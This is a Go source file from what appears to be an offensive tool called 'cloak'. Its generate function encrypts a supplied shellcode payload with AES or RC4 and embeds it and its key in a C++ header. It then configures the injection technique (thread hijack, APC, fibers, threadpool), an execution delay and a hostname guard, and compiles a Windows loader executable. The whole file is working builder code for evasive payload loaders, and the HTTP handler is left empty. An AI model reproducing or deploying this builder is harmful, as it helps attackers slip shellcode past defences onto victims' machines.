package api

import (
	"cloak/api/transport"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"

	gecko "github.com/HackLike-co/Gecko/Gecko"
)

func Generate(w http.ResponseWriter, r *http.Request) {

}

func generate(g transport.Generate) ([]byte, error) {

	// open Payload.hpp file
	pFile, err := os.OpenFile("./cloak/include/Payload.hpp", os.O_RDWR|os.O_TRUNC, 0755)
	if err != nil {
		return nil, err
	}
	defer pFile.Close()

	// check for encryption
	switch g.EncryptionAlgo {
	case "aes":
		key, err := gecko.GenerateKey()
		if err != nil {
			return nil, err
		}

		iv, err := gecko.GenerateIV()
		if err != nil {
			return nil, err
		}

		// encrypt payload
		ePayload, err := gecko.AES_CBCEncrypt(g.Payload, key, iv)
		if err != nil {
			log.Fatal(err)
		}

		output := fmt.Sprintf("#pragma once\n\n%s\n\n%s\n\n%s", gecko.C_FormatArray(ePayload, "Payload"), gecko.C_FormatArray(key, "Key"), gecko.C_FormatArray(iv, "IV"))

		// write updated payload
		pFile.WriteString(output)
	case "rc4":
		key, err := gecko.GenerateKey()
		if err != nil {
			return nil, err
		}

		// encrypt payload
		ePayload, err := gecko.RC4_Encrypt(g.Payload, key)
		if err != nil {
			log.Fatal(err)
		}

		output := fmt.Sprintf("#pragma once\n\n%s\n\n%s", gecko.C_FormatArray(ePayload, "Payload"), gecko.C_FormatArray(key, "Key"))

		// write updated payload
		pFile.WriteString(output)
	case "none":
		output := fmt.Sprintf("#pragma once\n\n%s", gecko.C_FormatArray(g.Payload, "Payload"))

		// write updated payload
		pFile.WriteString(output)
	default:
		return nil, errors.New("invalid encryption type")
	}

	// open Config.hpp file
	configFile, err := os.OpenFile("./cloak/include/Config.hpp", os.O_RDWR|os.O_TRUNC, 0755)
	if err != nil {
		return nil, err
	}
	defer configFile.Close()

	configOutput := "#pragma once\n\n#ifndef CONFIG_H\n#define CONFIG_H\n\n"

	switch g.EncryptionAlgo {
	case "aes":
		configOutput += "#define AES\n\n"
	case "rc4":
		configOutput += "#define RC4\n\n"
	}

	configOutput += fmt.Sprintf("#define DELAY %d\n\n", g.ExecDelay)

	if g.CheckHostname {
		configOutput += fmt.Sprintf("#define CHECK_HOSTNAME\n\n#ifdef CHECK_HOSTNAME\n#define HOSTNAME \"%s\"\nBOOL CheckHostname(IN LPSTR pwGuardHost);\n#endif\n\n", g.Hostname)
	}

	switch g.ExecutionMethod {
	case "inject":
		switch g.InjectMethod {
		case "local-thread":
			configOutput += "#define LOCAL_THREAD\n\n"
		case "local-hijack":
			configOutput += "#define LOCAL_THREAD_HIJACK\n\n"
		case "apc":
			configOutput += "#define APC\n\n"
		default:
			return nil, errors.New("invalid injection method")
		}
	case "fibers":
		configOutput += "#define FIBERS\n\n"
	case "threadpool":
		configOutput += "#define THREADPOOLWAIT\n\n"
	default:
		return nil, errors.New("invalid execution method")
	}

	configOutput += "#define WAIT_TIME INFINITE\n\n#endif"

	// write to config file
	configFile.WriteString(configOutput)

	// run make
	cmd := "make -C ./cloak/"
	cmdNoReturn(cmd)

	// read generated file
	fPayload, err := os.ReadFile("./cloak/bin/cloak.exe")
	if err != nil {
		return nil, err
	}

	// return generated payload
	return fPayload, nil
}

func cmdNoReturn(c string) {
	cmd := exec.Command("bash", "-c", c)
	cmd.Run()
}
